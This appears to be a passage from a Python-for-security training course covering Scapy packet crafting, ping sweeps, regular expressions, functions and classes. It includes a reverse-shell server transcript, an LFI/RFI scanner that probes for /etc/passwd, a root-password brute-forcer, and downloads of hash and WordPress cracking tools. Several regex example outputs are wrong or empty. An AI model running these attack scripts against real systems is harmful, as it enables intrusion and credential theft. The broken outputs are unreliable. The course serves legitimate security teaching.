+
+infosecaddicts@ubuntu:~$ python server.py
+
+----------------------------------------------------------------------
+
+Binding socket to port: 9999
+Connection has been established | IP 192.168.243.1 | Port 57779
+dir
+ Volume in drive C has no label.
+ 
+
+ Directory of C:\Python27
+
+
+
+
+
+
+
+
+
+
+
+###############################
+# Lesson 21: Installing Scapy #
+###############################
+
+---------------------------Type This-----------------------------------
+
+sudo apt-get update 
+sudo apt-get install python-scapy python-pyx python-gnuplot
+
+----------------------------------------------------------------------
+
+Reference Page For All Of The Commands We Will Be Running:
+http://samsclass.info/124/proj11/proj17-scapy.html
+
+Great slides for Scapy:
+http://www.secdev.org/conf/scapy_csw05.pdf
+
+
+
+
+To run Sapy interactively
+---------------------------Type This-----------------------------------
+
+	sudo scapy
+
+----------------------------------------------------------------------
+
+
+################################################
+# Lesson 22: Sending ICMPv4 Packets with scapy #
+################################################
+
+In the Linux machine, in the Terminal window, at the >>> prompt, type this command, and then press the Enter key:
+
+---------------------------Type This-----------------------------------
+
+    i = IP() 
+
+----------------------------------------------------------------------
+
+
+
+This creates an object named i of type IP. To see the properties of that object, use the display() method with this command:
+
+---------------------------Type This-----------------------------------
+
+    i.display() 
+
+----------------------------------------------------------------------
+
+
+
+Use these commands to set the destination IP address and display the properties of the i object again. Replace the IP address in the first command with the IP address of your target Windows machine:
+
+---------------------------Type This-----------------------------------
+
+    i.dst="10.65.75.49"
+
+    i.display() 
+
+
+----------------------------------------------------------------------
+
+
+Notice that scapy automatically fills in your machine's source IP address.
+
+Use these commands to create an object named ic of type ICMP and display its properties:
+
+---------------------------Type This-----------------------------------
+
+    ic = ICMP()
+
+    ic.display() 
+
+
+----------------------------------------------------------------------
+
+
+
+Use this command to send the packet onto the network and listen to a single packet in response. Note that the third character is the numeral 1, not a lowercase L:
+
+---------------------------Type This-----------------------------------
+
+    sr1(i/ic) 
+
+----------------------------------------------------------------------
+
+
+
+
+This command sends and receives one packet, of type IP at layer 3 and ICMP at layer 4. As you can see in the image above, the response is shown, with ICMP type echo-reply. 
+
+The Padding section shows the portion of the packet that carries higher-level data. In this case it contains only zeroes as padding.
+
+Use this command to send a packet that is IP at layer 3, ICMP at layer 4, and that contains data with your name in it (replace YOUR NAME with your own name):
+
+---------------------------Type This-----------------------------------
+
+    sr1(i/ic/"YOUR NAME") 
+
+----------------------------------------------------------------------
+
+You should see a reply with a Raw section containing your name.
+
+
+
+##############################################
+# Lesson 23: Sending a UDP Packet with Scapy #
+##############################################
+
+
+Preparing the Target
+
+---------------------------Type This-----------------------------------
+
+$ ncat -ulvp 4444
+
+----------------------------------------------------------------------
+
+
+
+--open another terminal--
+In the Linux machine, in the Terminal window, at the >>> prompt, type these commands, and then press the Enter key:
+
+---------------------------Type This-----------------------------------
+
+
+    u = UDP()
+
+    u.display() 
+
+----------------------------------------------------------------------
+
+
+This creates an object named u of type UDP, and displays its properties.
+
+Execute these commands to change the destination port to 4444 and display the properties again:
+
+---------------------------Type This-----------------------------------
+
+    i.dst="10.10.2.97"				<--- replace this with a host that you can run netcat on (ex: another VM or your host computer)
+
+    u.dport = 4444
+
+    u.display() 
+
+----------------------------------------------------------------------
+
+
+Execute this command to send the packet to the Windows machine:
+
+---------------------------Type This-----------------------------------
+
+    send(i/u/"YOUR NAME SENT VIA UDP\n") 
+
+----------------------------------------------------------------------
+
+
+On the Windows target, you should see the message appear
+
+
+
+
+#######################################
+# Lesson 24: Ping Sweeping with Scapy #
+#######################################
+
+---------------------------Paste This-----------------------------------
+
+
+#!/usr/bin/python
+from scapy.all import *
+
+TIMEOUT = 2
+conf.verb = 0
+for ip in range(0, 256):
+    packet = IP(dst="10.10.30." + str(ip), ttl=20)/ICMP()
+	# You will need to change 10.10.30 above this line to the subnet for your network
+    reply = sr1(packet, timeout=TIMEOUT)
+    if not (reply is None):
+         print reply.dst, "is online"
+    else:
+         print "Timeout waiting for %s" % packet[IP].dst
+
+----------------------------------------------------------------------
+
+
+###############################################
+# Checking out some scapy based port scanners #
+###############################################
+
+---------------------------Type This-----------------------------------
+
+wget https://s3.amazonaws.com/infosecaddictsfiles/rdp_scan.py
+
+cat rdp_scan.py
+
+sudo python rdp_scan.py
+
+----------------------------------------------------------------------
+
+######################################
+# Dealing with conf.verb=0 NameError #
+######################################
+
+---------------------------Type This-----------------------------------
+
+conf.verb = 0
+NameError: name 'conf' is not defined
+
+Fixing scapy - some scripts are written for the old version of scapy so you'll have to change the following line from:
+
+from scapy import *
+	to
+from scapy.all import *
+-----------------------------------------------------------------------
+
+
+
+Reference:
+http://hexale.blogspot.com/2008/10/wifizoo-and-new-version-of-scapy.html
+
+
+conf.verb=0 is a verbosity setting (configuration/verbosity = conv
+
+
+
+Here are some good Scapy references:
+http://www.secdev.org/projects/scapy/doc/index.html
+http://resources.infosecinstitute.com/port-scanning-using-scapy/
+http://www.hackerzvoice.net/ouah/blackmagic.txt
+http://www.workrobot.com/sansfire2009/SCAPY-packet-crafting-reference.html
+
+
+
+
+
+
+
+
+
+
+
+
+##################################
+# Lesson 25: Regular Expressions #
+##################################
+
+
+
+**************************************************
+* What is Regular Expression and how is it used? *
+**************************************************
+
+
+Simply put, regular expression is a sequence of character(s) mainly used to find and replace patterns in a string or file. 
+
+
+Regular expressions use two types of characters:
+
+a) Meta characters: As the name suggests, these characters have a special meaning, similar to * in wildcard.
+
+b) Literals (like a,b,1,2…)
+
+
+In Python, we have module "re" that helps with regular expressions. So you need to import library re before you can use regular expressions in Python.
+
+
+Use this code --> import re
+
+
+
+
+The most common uses of regular expressions are:
+--------------------------------------------------
+
+- Search a string (search and match)
+- Finding a string (findall)
+- Break string into a sub strings (split)
+- Replace part of a string (sub)
+
+
+
+Let's look at the methods that library "re" provides to perform these tasks.
+
+
+
+****************************************************
+* What are various methods of Regular Expressions? *
+****************************************************
+
+
+The ‘re' package provides multiple methods to perform queries on an input string. Here are the most commonly used methods, I will discuss:
+
+re.match()
+re.search()
+re.findall()
+re.split()
+re.sub()
+re.compile()
+
+Let's look at them one by one.
+
+ 
+re.match(pattern, string):
+-------------------------------------------------
+
+This method finds match if it occurs at start of the string. For example, calling match() on the string ‘AV Analytics AV' and looking for a pattern ‘AV' will match. However, if we look for only Analytics, the pattern will not match. Let's perform it in python now.
+
+Code
+---------------------------Type This-----------------------------------
+
+import re
+result = re.match(r'AV', 'AV Analytics ESET AV')
+print result
+----------------------------------------------------------------------
+
+Output:
+<_sre.SRE_Match object at 0x0000000009BE4370>
+
+Above, it shows that pattern match has been found. To print the matching string we'll use method group (It helps to return the matching string). Use "r" at the start of the pattern string, it designates a python raw string.
+
+---------------------------Type This-----------------------------------
+
+result = re.match(r'AV', 'AV Analytics ESET AV')
+print result.group(0)
+----------------------------------------------------------------------
+
+Output:
+AV
+
+
+Let's now find ‘Analytics' in the given string. Here we see that string is not starting with ‘AV' so it should return no match. Let's see what we get:
+
+
+Code
+---------------------------Type This-----------------------------------
+
+result = re.match(r'Analytics', 'AV Analytics ESET AV')
+print result 
+----------------------------------------------------------------------
+
+
+Output: 
+None
+
+
+There are methods like start() and end() to know the start and end position of matching pattern in the string.
+
+Code
+---------------------------Type This-----------------------------------
+
+result = re.match(r'AV', 'AV Analytics ESET AV')
+print result.start()
+print result.end()
+----------------------------------------------------------------------
+
+Output:
+0
+2
+
+Above you can see that start and end position of matching pattern ‘AV' in the string and sometime it helps a lot while performing manipulation with the string.
+
+
+
+
+
+re.search(pattern, string):
+-----------------------------------------------------
+
+
+It is similar to match() but it doesn't restrict us to find matches at the beginning of the string only. Unlike previous method, here searching for pattern ‘Analytics' will return a match.
+
+Code
+---------------------------Type This-----------------------------------
+
+result = re.search(r'Analytics', 'AV Analytics ESET AV')
+print result.group(0)
+----------------------------------------------------------------------
+
+Output:
+Analytics
+
+Here you can see that, search() method is able to find a pattern from any position of the string but it only returns the first occurrence of the search pattern.
+
+
+
+
+
+
+re.findall (pattern, string):
+------------------------------------------------------
+
+
+It helps to get a list of all matching patterns. It has no constraints of searching from start or end. If we will use method findall to search ‘AV' in given string it will return both occurrence of AV. While searching a string, I would recommend you to use re.findall() always, it can work like re.search() and re.match() both.
+
+
+Code
+---------------------------Type This-----------------------------------
+
+result = re.findall(r'AV', 'AV Analytics ESET AV')
+print result
+----------------------------------------------------------------------
+
+Output:
+['AV', 'AV']
+
+
+
+
+
+re.split(pattern, string, [maxsplit=0]):
+------------------------------------------------------
+
+
+
+This methods helps to split string by the occurrences of given pattern.
+
+
+Code
+---------------------------Type This-----------------------------------
+
+result=re.split(r'y','Analytics')
+result
+ ----------------------------------------------------------------------
+
+Output:
+[]
+
+Above, we have split the string "Analytics" by "y". Method split() has another argument "maxsplit". It has default value of zero. In this case it does the maximum splits that can be done, but if we give value to maxsplit, it will split the string. Let's look at the example below:
+
+
+Code
+---------------------------Type This-----------------------------------
+
+result=re.split(r's','Analytics eset')
+print result
+----------------------------------------------------------------------
+
+Output:
+['Analytic', ' e', 'et'] #It has performed all the splits that can be done by pattern "s".
+
+
+
+Code
+---------------------------Type This-----------------------------------
+
+result=re.split(r's','Analytics eset',maxsplit=1)
+result
+----------------------------------------------------------------------
+
+Output:
+[]
+
+
+
+
+
+re.sub(pattern, repl, string):
+----------------------------------------------------------
+
+It helps to search a pattern and replace with a new sub string. If the pattern is not found, string is returned unchanged.
+
+Code
+---------------------------Type This-----------------------------------
+
+result=re.sub(r'Ruby','Python','Joe likes Ruby')
+result
+----------------------------------------------------------------------
+ 
+Output:
+''
+
+
+
+
+
+re.compile(pattern, repl, string):
+----------------------------------------------------------
+
+
+We can combine a regular expression pattern into pattern objects, which can be used for pattern matching. It also helps to search a pattern again without rewriting it.
+
+
+Code
+---------------------------Type This-----------------------------------
+
+import re
+pattern=re.compile('XSS')
+result=pattern.findall('XSS is Cross Site Scripting, XSS')
+print result
+result2=pattern.findall('XSS is Cross Site Scripting, SQLi is Sql Injection')
+print result2
+----------------------------------------------------------------------
+
+Output:
+['XSS', 'XSS']
+['XSS']
+
+Till now,  we looked at various methods of regular expression using a constant pattern (fixed characters). But, what if we do not have a constant search pattern and we want to return specific set of characters (defined by a rule) from a string?  Don't be intimidated.
+
+This can easily be solved by defining an expression with the help of pattern operators (meta  and literal characters). Let's look at the most common pattern operators.
+
+ 
+
+
+############################################
+# Lesson 26: Regular Expressions operators #
+############################################
+
+**********************************************
+* What are the most commonly used operators? *
+**********************************************
+
+
+Regular expressions can specify patterns, not just fixed characters. Here are the most commonly used operators that helps to generate an expression to represent required characters in a string or file. It is commonly used in web scrapping and  text mining to extract required information.
+
+Operators	Description
+.	        Matches with any single character except newline ‘\n'.
+?	        match 0 or 1 occurrence of the pattern to its left
++	        1 or more occurrences of the pattern to its left
+*	        0 or more occurrences of the pattern to its left
+\w	        Matches with a alphanumeric character whereas \W (upper case W) matches non alphanumeric character.
+\d	        Matches with digits [0-9] and /D (upper case D) matches with non-digits.
+\s	        Matches with a single white space character (space, newline, return, tab, form) and \S (upper case S) matches any non-white space character.
+\b	        boundary between word and non-word and /B is opposite of /b
+[..]	        Matches any single character in a square bracket and [^..] matches any single character not in square bracket
+\	        It is used for special meaning characters like \. to match a period or \+ for plus sign.
+^ and $	        ^ and $ match the start or end of the string respectively
+{n,m}	        Matches at least n and at most m occurrences of preceding expression if we write it as {,m} then it will return at least any minimum occurrence to max m preceding expression.
+a| b	        Matches either a or b
+( )	        Groups regular expressions and returns matched text
+\t, \n, \r	Matches tab, newline, return
+
+
+For more details on  meta characters "(", ")","|" and others details , you can refer this link (https://docs.python.org/2/library/re.html).
+
+Now, let's understand the pattern operators by looking at the below examples.
+
+ 
+
+****************************************
+* Some Examples of Regular Expressions *
+****************************************
+
+******************************************************
+* Problem 1: Return the first word of a given string *
+******************************************************
+
+
+Solution-1  Extract each character (using "\w")
+---------------------------------------------------------------------------
+
+Code
+---------------------------Type This-----------------------------------
+
+import re
+result=re.findall(r'.','Python is the best scripting language')
+print result
+----------------------------------------------------------------------
+ 
+Output:
+['P', 'y', 't', 'h', 'o', 'n', ' ', 'i', 's', ' ', 't', 'h', 'e', ' ', 'b', 'e', 's', 't', ' ', 's', 'c', 'r', 'i', 'p', 't', 'i', 'n', 'g', ' ', 'l', 'a', 'n', 'g', 'u', 'a', 'g', 'e']
+
+
+Above, space is also extracted, now to avoid it use "\w" instead of ".".
+
+
+Code
+---------------------------Type This-----------------------------------
+
+result=re.findall(r'\w','Python is the best scripting language')
+print result
+----------------------------------------------------------------------
+ 
+Output:
+['P', 'y', 't', 'h', 'o', 'n', 'i', 's', 't', 'h', 'e', 'b', 'e', 's', 't', 's', 'c', 'r', 'i', 'p', 't', 'i', 'n', 'g', 'l', 'a', 'n', 'g', 'u', 'a', 'g', 'e']
+
+
+
+
+Solution-2  Extract each word (using "*" or "+")
+---------------------------------------------------------------------------
+
+Code
+---------------------------Type This-----------------------------------
+
+result=re.findall(r'\w*','Python is the best scripting language')
+print result
+----------------------------------------------------------------------
+ 
+Output:
+['Python', '', 'is', '', 'the', '', 'best', '', 'scripting', '', 'language', '']
+ 
+
+Again, it is returning space as a word because "*" returns zero or more matches of pattern to its left. Now to remove spaces we will go with "+".
+
+Code
+---------------------------Type This-----------------------------------
+
+result=re.findall(r'\w+','Python is the best scripting language')
+print result
+----------------------------------------------------------------------
+ 
+Output:
+['Python', 'is', 'the', 'best', 'scripting', 'language']
+
+
+
+
+Solution-3 Extract each word (using "^")
+-------------------------------------------------------------------------------------
+
+
+Code
+---------------------------Type This-----------------------------------
+
+result=re.findall(r'^\w+','Python is the best scripting language')
+print result
+----------------------------------------------------------------------
+
+Output:
+['Python']
+
+If we will use "$" instead of "^", it will return the word from the end of the string. Let's look at it.
+
+Code
+---------------------------Type This-----------------------------------
+
+result=re.findall(r'\w+$','Python is the best scripting language')
+print result
+----------------------------------------------------------------------
+
+Output:
+[‘language']
+
+
+
+
+
+********************************************************** 
+* Problem 2: Return the first two character of each word *
+**********************************************************
+
+
+
+
+Solution-1  Extract consecutive two characters of each word, excluding spaces (using "\w")
+------------------------------------------------------------------------------------------------------
+
+Code
+---------------------------Type This-----------------------------------
+
+result=re.findall(r'\w\w','Python is the best')
+print result
+----------------------------------------------------------------------
+ 
+Output:
+['Py', 'th', 'on', 'is', 'th', 'be', 'st']
+
+
+
+
+
+Solution-2  Extract consecutive two characters those available at start of word boundary (using "\b")
+------------------------------------------------------------------------------------------------------
+
+Code
+---------------------------Type This-----------------------------------
+
+result=re.findall(r'\b\w.','Python is the best')
+print result
+----------------------------------------------------------------------
+ 
+Output:
+['Py', 'is', 'th', 'be']
+
+
+
+
+
+
+********************************************************
+* Problem 3: Return the domain type of given email-ids *
+********************************************************
+
+
+To explain it in simple manner, I will again go with a stepwise approach:
+
+
+
+
+
+Solution-1  Extract all characters after "@"
+------------------------------------------------------------------------------------------------------------------
+
+Code
+---------------------------Type This-----------------------------------
+
+result=re.findall(r'@\w+','abc.test@gmail.com, xyz@test.com, test.first@strategicsec.com, first.test@rest.biz') 
+print result 
+----------------------------------------------------------------------
+
+Output: ['@gmail', '@test', '@strategicsec', '@rest']
+
+
+
+Above, you can see that ".com", ".biz" part is not extracted. To add it, we will go with below code.
+
+---------------------------Type This-----------------------------------
+
+result=re.findall(r'@\w+.\w+','abc.test@gmail.com, xyz@test.com, test.first@strategicsec.com, first.test@rest.biz')
+print result
+----------------------------------------------------------------------
+
+Output:
+['@gmail.com', '@test.com', '@strategicsec.com', '@rest.biz']
+
+
+
+
+
+
+Solution – 2 Extract only domain name using "( )"
+-----------------------------------------------------------------------------------------------------------------------
+
+
+Code
+---------------------------Type This-----------------------------------
+
+result=re.findall(r'@\w+.(\w+)','abc.test@gmail.com, xyz@test.com, test.first@strategicsec.com, first.test@rest.biz')
+print result
+----------------------------------------------------------------------
+
+Output:
+['com', 'com', 'com', 'biz']
+
+
+
+
+
+
+********************************************
+* Problem 4: Return date from given string *
+********************************************
+
+
+Here we will use "\d" to extract digit.
+
+
+Solution:
+----------------------------------------------------------------------------------------------------------------------
+
+Code
+---------------------------Type This-----------------------------------
+
+result=re.findall(r'\d{2}-\d{2}-\d{4}','Joe 34-3456 12-05-2007, XYZ 56-4532 11-11-2016, ABC 67-8945 12-01-2009')
+print result
+----------------------------------------------------------------------
+
+Output:
+['12-05-2007', '11-11-2016', '12-01-2009']
+
+If you want to extract only year again parenthesis "( )" will help you.
+
+
+Code
+
+---------------------------Type This-----------------------------------
+
+result=re.findall(r'\d{2}-\d{2}-(\d{4})','Joe 34-3456 12-05-2007, XYZ 56-4532 11-11-2016, ABC 67-8945 12-01-2009')
+print result
+----------------------------------------------------------------------
+
+Output:
+['2007', '2016', '2009']
+
+
+
+
+
+*******************************************************************
+* Problem 5: Return all words of a string those starts with vowel *
+*******************************************************************
+
+
+
+
+Solution-1  Return each words
+-----------------------------------------------------------------------------------------------------------------
+
+Code
+---------------------------Type This-----------------------------------
+
+result=re.findall(r'\w+','Python is the best')
+print result
+----------------------------------------------------------------------
+
+Output:
+['Python', 'is', 'the', 'best']
+
+
+
+
+
+Solution-2  Return words starts with alphabets (using [])
+------------------------------------------------------------------------------------------------------------------
+
+Code
+---------------------------Type This-----------------------------------
+
+result=re.findall(r'[aeiouAEIOU]\w+','I love Python')
+print result
+----------------------------------------------------------------------
+ 
+Output:
+['ove', 'on']
+
+Above you can see that it has returned "ove" and "on" from the mid of words. To drop these two, we need to use "\b" for word boundary.
+
+
+
+
+
+Solution- 3
+------------------------------------------------------------------------------------------------------------------
+
+Code
+---------------------------Type This-----------------------------------
+
+result=re.findall(r'\b[aeiouAEIOU]\w+','I love Python')
+print result
+----------------------------------------------------------------------
+ 
+Output:
+[]
+
+In similar ways, we can extract words those starts with constant using "^" within square bracket.
+
+
+Code
+---------------------------Type This-----------------------------------
+
+result=re.findall(r'\b[^aeiouAEIOU]\w+','I love Python')
+print result
+----------------------------------------------------------------------
+
+Output:
+[' love', ' Python']
+
+Above you can see that it has returned words starting with space. To drop it from output, include space in square bracket[].
+
+
+Code
+---------------------------Type This-----------------------------------
+
+result=re.findall(r'\b[^aeiouAEIOU ]\w+','I love Python')
+print result
+----------------------------------------------------------------------
+
+Output:
+['love', 'Python']
+
+
+
+
+
+
+*************************************************************************************************
+* Problem 6: Validate a phone number (phone number must be of 10 digits and starts with 8 or 9) *
+*************************************************************************************************
+
+
+We have a list phone numbers in list "li" and here we will validate phone numbers using regular
+
+
+
+
+Solution
+-------------------------------------------------------------------------------------------------------------------------------------
+
+
+Code
+---------------------------Type This-----------------------------------
+
+import re
+li=['9999999999','999999-999','99999x9999']
+for val in li:
+ if re.match(r'[8-9]{1}[0-9]{9}',val) and len(val) == 10:
+     print 'yes'
+ else:
+     print 'no'
+
+----------------------------------------------------------------------
+
+Output:
+yes
+no
+no
+
+
+
+
+
+******************************************************
+* Problem 7: Split a string with multiple delimiters *
+******************************************************
+
+
+
+Solution
+---------------------------------------------------------------------------------------------------------------------------
+
+
+Code
+---------------------------Type This-----------------------------------
+
+import re
+line = 'asdf fjdk;afed,fjek,asdf,foo' # String has multiple delimiters (";",","," ").
+result= re.split(r'[;,\s]', line)
+print result
+----------------------------------------------------------------------
+
+Output:
+['asdf', 'fjdk', 'afed', 'fjek', 'asdf', 'foo']
+
+
+
+We can also use method re.sub() to replace these multiple delimiters with one as space " ".
+
+
+Code
+---------------------------Type This-----------------------------------
+
+import re
+line = 'asdf fjdk;afed,fjek,asdf,foo'
+result= re.sub(r'[;,\s]',' ', line)
+print result
+----------------------------------------------------------------------
+
+Output:
+asdf fjdk afed fjek asdf foo
+
+
+
+
+**************************************************
+* Problem 8: Retrieve Information from HTML file *
+**************************************************
+
+
+
+I want to extract information from a HTML file (see below sample data). Here we need to extract information available between <td> and </td> except the first numerical index. I have assumed here that below html code is stored in a string str.
+
+
+
+Sample HTML file (str)
+---------------------------Paste This-----------------------------------
+
+<tr align="center"><td>1</td> <td>Noah</td> <td>Emma</td></tr>
+<tr align="center"><td>2</td> <td>Liam</td> <td>Olivia</td></tr>
+<tr align="center"><td>3</td> <td>Mason</td> <td>Sophia</td></tr>
+<tr align="center"><td>4</td> <td>Jacob</td> <td>Isabella</td></tr>
+<tr align="center"><td>5</td> <td>William</td> <td>Ava</td></tr>
+<tr align="center"><td>6</td> <td>Ethan</td> <td>Mia</td></tr>
+<tr align="center"><td>7</td> <td HTML>Michael</td> <td>Emily</td></tr>
+----------------------------------------------------------------------
+
+Solution:
+
+
+
+Code
+---------------------------Type This-----------------------------------
+
+result=re.findall(r'<td>\w+</td>\s<td>(\w+)</td>\s<td>(\w+)</td>',str)
+print result
+----------------------------------------------------------------------
+
+Output:
+[('Noah', 'Emma'), ('Liam', 'Olivia'), ('Mason', 'Sophia'), ('Jacob', 'Isabella'), ('William', 'Ava'), ('Ethan', 'Mia'), ('Michael', 'Emily')]
+
+
+
+You can read html file using library urllib2 (see below code).
+
+
+Code
+---------------------------Type This-----------------------------------
+
+import urllib2
+response = urllib2.urlopen('')
+html = response.read()
+----------------------------------------------------------------------
+
+
+
+
+
+
+#################################################
+# Lesson 27: Python Functions & String Handling #
+#################################################
+
+Python can make use of functions:
+http://www.tutorialspoint.com/python/python_functions.htm
+
+
+
+Python can interact with the 'crypt' function used to create Unix passwords:
+http://docs.python.org/2/library/crypt.html
+
+
+
+Tonight we will see a lot of the split() method so be sure to keep the following references close by:
+http://www.tutorialspoint.com/python/string_split.htm
+
+
+Tonight we will see a lot of slicing so be sure to keep the following references close by:
+http://techearth.net/python/index.php5?title=Python:Basics:Slices
+
+
+---------------------------Type This-----------------------------------
+vi LFI-RFI.py
+
+
+---------------------------Paste This-----------------------------------
+
+
+#!/usr/bin/env python
+print "\n### PHP LFI/RFI Detector ###"
+
+import urllib2,re,sys
+
+TARGET = "http://10.1.1.38/showfile.php?filename=about.txt"
+RFIVULN = "https://raw.githubusercontent.com/gruntjs/grunt-contrib-connect/master/test/fixtures/hello.txt?"
+TravLimit = 12
+
+print "==> Testing for LFI vulns.."
+TARGET = TARGET.split("=")[0]+"=" ## URL MANUPLIATION 
+for x in xrange(1,TravLimit): ## ITERATE THROUGH THE LOOP
+    TARGET += "../"
+    try:
+        source = urllib2.urlopen((TARGET+"etc/passwd")).read() ## WEB REQUEST
+    except urllib2.URLError, e:
+        print "$$$ We had an Error:",e
+        sys.exit(0)
+    if re.search("root:x:0:0:",source): ## SEARCH FOR TEXT IN SOURCE
+        print "!! ==> LFI Found:",TARGET+"etc/passwd"
+        break ## BREAK LOOP WHEN VULN FOUND
+
+print "\n==> Testing for RFI vulns.."
+TARGET = TARGET.split("=")[0]+"="+RFIVULN ## URL MANUPLIATION
+try:
+    source = urllib2.urlopen(TARGET).read() ## WEB REQUEST
+except urllib2.URLError, e:
+    print "$$$ We had an Error:",e
+    sys.exit(0)
+if re.search("Hello world",source): ## SEARCH FOR TEXT IN SOURCE
+    print "!! => RFI Found:",TARGET
+    
+print "\nScan Complete\n" ## DONE
+
+
+
+-----------------------------------------------------------------------
+
+
+################################
+# Lesson 28: Password Cracking #
+################################
+
+---------------------------Type This-----------------------------------
+
+wget https://s3.amazonaws.com/infosecaddictsfiles/htcrack.py
+
+vi htcrack.py
+
+vi list.txt
+
+---------------------------Paste This-----------------------------------
+
+hello
+goodbye
+red
+blue
+yourname
+tim
+bob
+
+-----------------------------------------------------------------------
+
+---------------------------Type This-----------------------------------
+
+htpasswd -nd yourname
+	- enter yourname as the password
+
+
+
+python htcrack.py joe:7XsJIbCFzqg/o list.txt
+
+
+
+
+sudo apt-get install -y python-mechanize python-pexpect python-pexpect-doc
+
+rm -rf mechanize-0.2.5.tar.gz
+
+sudo /bin/bash
+
+passwd
+	***set root password***
+
+
+
+---------------------------Type This-----------------------------------
+
+vi rootbrute.py
+
+---------------------------Paste This-----------------------------------
+
+#!/usr/bin/env python
+
+import sys
+try:
+        import pexpect
+except(ImportError):
+        print "\nYou need the pexpect module."
+        print "http://www.noah.org/wiki/Pexpect\n"
+        sys.exit(1)
+
+#Change this if needed.
+# LOGIN_ERROR = 'su: incorrect password'
+LOGIN_ERROR = "su: Authentication failure"
+
+def brute(word):
+        print "Trying:",word
+        child = pexpect.spawn('/bin/su')
+        child.expect('Password: ')
+        child.sendline(word)
+        i = child.expect (['.+\s#\s',LOGIN_ERROR, pexpect.TIMEOUT],timeout=3)
+        if i == 1:
+                print "Incorrect Password"
+
+        if i == 2:
+                print "\n\t[!] Root Password:" ,word
+                child.sendline ('id')
+                print child.before
+                child.interact()
+
+if len(sys.argv) != 2:
+        print "\nUsage : ./rootbrute.py <wordlist>"
+        print "Eg: ./rootbrute.py words.txt\n"
+        sys.exit(1)
+
+try:
+        words = open(sys.argv[1], "r").readlines()
+except(IOError):
+        print "\nError: Check your wordlist path\n"
+        sys.exit(1)
+
+print "\n[+] Loaded:",len(words),"words"
+print "[+] BruteForcing...\n"
+for word in words:
+        brute(word.replace("\n",""))
+
+
+-----------------------------------------------------------------------
+
+
+References you might find helpful:
+http://stackoverflow.com/questions/15026536/looping-over-a-some-ips-from-a-file-in-python
+
+
+
+
+
+
+
+---------------------------Type This-----------------------------------
+
+
+wget https://s3.amazonaws.com/infosecaddictsfiles/md5crack.py
+
+vi md5crack.py
+
+
+-----------------------------------------------------------------------
+
+
+
+
+Why use hexdigest
+http://stackoverflow.com/questions/3583265/compare-result-from-hexdigest-to-a-string
+
+
+
+
+http://md5online.net/
+
+
+
+
+
+---------------------------Type This-----------------------------------
+
+
+wget https://s3.amazonaws.com/infosecaddictsfiles/wpbruteforcer.py
+
+
+-----------------------------------------------------------------------
+
+
+
+########################
+# Lesson 29: Functions #
+########################
+
+
+***********************
+* What are Functions? *
+***********************
+
+
+Functions are a convenient way to divide your code into useful blocks, allowing us to order our code, make it more readable, reuse it and save some time. Also functions are a key way to define interfaces so programmers can share their code.
+
+How do you write functions in Python?
+
+Python makes use of blocks.
+
+A block is a area of code of written in the format of:
+
+ block_head:
+    
+      1st block line
+    
+      2nd block line
+    
+      ...
+
+
+Where a block line is more Python code (even another block), and the block head is of the following format: block_keyword block_name(argument1,argument2, ...) Block keywords you already know are "if", "for", and "while".
+
+Functions in python are defined using the block keyword "def", followed with the function's name as the block's name. For example:
+
+def my_function():
+    print("Hello From My Function!")
+
+
+Functions may also receive arguments (variables passed from the caller to the function). For example:
+
+def my_function_with_args(username, greeting):
+    print("Hello, %s , From My Function!, I wish you %s"%(username, greeting))
+
+
+Functions may return a value to the caller, using the keyword- 'return' . For example:
+
+def sum_two_numbers(a, b):
+    return a + b
+
+
+****************************************
+* How do you call functions in Python? *
+****************************************
+
+Simply write the function's name followed by (), placing any required arguments within the brackets. For example, lets call the functions written above (in the previous example):
+
+# Define our 3 functions
+---------------------------Paste This-----------------------------------
+
+def my_function():
+    print("Hello From My Function!")
+
+def my_function_with_args(username, greeting):
+    print("Hello, %s , From My Function!, I wish you %s"%(username, greeting))
+
+def sum_two_numbers(a, b):
+    return a + b
+
+# print(a simple greeting)
+my_function()
+
+#prints - "Hello, Joe, From My Function!, I wish you a great year!"
+my_function_with_args("Joe", "a great year!")
+
+# after this line x will hold the value 3!
+x = sum_two_numbers(1,2)
+-----------------------------------------------------------------------
+
+
+************
+* Exercise *
+************
+
+In this exercise you'll use an existing function, and while adding your own to create a fully functional program.
+
+Add a function named list_benefits() that returns the following list of strings: "More organized code", "More readable code", "Easier code reuse", "Allowing programmers to share and connect code together"
+
+Add a function named build_sentence(info) which receives a single argument containing a string and returns a sentence starting with the given string and ending with the string " is a benefit of functions!"
+
+Run and see all the functions work together!
+
+
+---------------------------Paste This-----------------------------------
+
+# Modify this function to return a list of strings as defined above
+def list_benefits():
+    pass
+
+# Modify this function to concatenate to each benefit - " is a benefit of functions!"
+def build_sentence(benefit):
+    pass
+
+def name_the_benefits_of_functions():
+    list_of_benefits = list_benefits()
+    for benefit in list_of_benefits:
+        print(build_sentence(benefit))
+
+name_the_benefits_of_functions()
+
+
+-----------------------------------------------------------------------
+
+
+
+
+#####################################
+# Lesson 30: Python Lambda Function #
+#####################################
+
+
+Python allows you to create anonymous function i.e function having no names using a facility called lambda function.
+
+lambda functions are small functions usually not more than a line. It can have any number of arguments just like a normal function. The body of lambda functions is very small and consists of only one expression. The result of the expression is the value when the lambda is applied to an argument. Also there is no need for any return statement in lambda function.
+
+Let’s take an example:
+
+Consider a function multiply()
+
+def multiply(x, y):
+    return x * y
+
+
+This function is too small, so let’s convert it into a lambda function.
+
+To create a lambda function first write keyword lambda followed by one of more arguments separated by comma, followed by colon sign ( : ), followed by a single line expression.
+
+---------------------------Type This-----------------------------------
+
+>>> r = lambda x, y: x * y
+>>> r(12,3)
+36
+-----------------------------------------------------------------------
+
+Here we are using two arguments x  and y , expression after colon is the body of the lambda function. As you can see lambda function has no name and is called through the variable it is assigned to.
+
+You don’t need to assign lambda function to a variable.
+
+---------------------------Type This-----------------------------------
+
+>>> (lambda x, y: x * y)(3,4)
+12
+-----------------------------------------------------------------------
+
+Note that lambda function can’t contain more than one expression.
+
+
+
+#############################
+# Lesson 31: Python Classes #
+#############################
+
+
+****************
+* Introduction *
+****************
+
+Classes are the cornerstone of Object Oriented Programming. They are the blueprints used to create objects. And, as the name suggests, all of Object Oriented Programming centers around the use of objects to build programs. 
+
+You don't write objects, not really. They are created, or instantiated, in a program using a class as their basis. So, you design objects by writing classes. That means that the most important part of understanding Object Oriented Programming is understanding what classes are and how they work.
+
+
+***********************
+* Real World Examples *
+***********************
+
+
+This next part if going to get abstract. You can think of objects in programming just like objects in the real world. Classes are then the way you would describe those objects and the plans for what they can do. 
+
+Start off by thinking about a web vuln scanner. 
+
